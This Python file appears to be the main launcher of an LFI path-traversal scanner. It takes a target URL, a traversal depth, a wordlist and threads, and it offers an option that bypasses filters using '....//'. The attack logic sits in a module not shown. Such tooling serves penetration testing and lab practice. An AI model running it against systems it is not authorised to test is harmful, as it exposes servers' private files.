from banner.banner import *
from attacks.linux import LinuxLFI
import argparse
import asyncio
import time

parse = argparse.ArgumentParser()
parse.add_argument("-t","--target",  help="Target of the host example: http://94.237.61.133:39139/index.php?language=", required=True)
parse.add_argument("-wc", "--walkcount", help="Number of directories to walk up", required=True)
parse.add_argument("-w", "--wordlist", help="Specify path to your wordlist you want", required=True)
parse.add_argument('-th', '--threads', help="(Optional): Amount of threads to execute requests in parallel in batch fashion", required=False)
parse.add_argument('-nrf', '--nonrecursivefilter', action="store_true", help="An argument to help by pass non recursive path traversals filters by appending ....// instead of ../", required=False)
parse = parse.parse_args()


async def main():
	if parse.target and parse.walkcount and parse.wordlist:
		banner()
		print("\nURL target ->> {}\n".format(parse.target))
		file_paths = open(parse.wordlist, "r")
		await LinuxLFI.execute_attack_parallel(file_paths, parse)
	else:
		print(f"{RED_NORMAL}[ERR0R]{END} Argument invalid\nRequest help : python3 LFIscanner.py --help\nExit the script...")
		time.sleep(2)
		exit(0)	

asyncio.run(main())